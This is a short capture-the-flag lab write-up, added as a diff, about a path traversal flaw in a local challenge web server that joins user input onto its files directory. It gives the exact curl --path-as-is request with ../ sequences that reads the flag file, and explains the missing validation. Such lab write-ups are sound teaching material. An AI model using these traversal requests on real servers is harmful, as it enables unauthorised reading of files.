@@ -1,0 +1,36 @@
+Start the server:
+/challenge/server
+Open another terminal and test the web server:
+curl -v http://challenge.localhost/blob
+Read the server source code:
+cat /challenge/server
+
+The server constructs the requested file path using:
+
+requested_path = app.root_path + "/files/" + path
+
+The path value is controlled by the user, and there is no validation to prevent ../ sequences.
+
+The intended directory is:
+/challenge/files/
+
+Using ../ allows us to move outside this directory.
+
+Request the flag using path traversal:
+curl --path-as-is http://challenge.localhost/blob/../../flag
+
+The server receives:
+
+/challenge/files/../../flag
+
+which resolves to:
+
+/flag
+The server returns the flag.
+Vulnerability
+
+The application directly concatenates the user-controlled path with the /files/ directory without validating the resulting path.
+
+The --path-as-is option is required because it prevents curl from normalizing the ../ sequences before sending the request.
+
+Congratulations!!
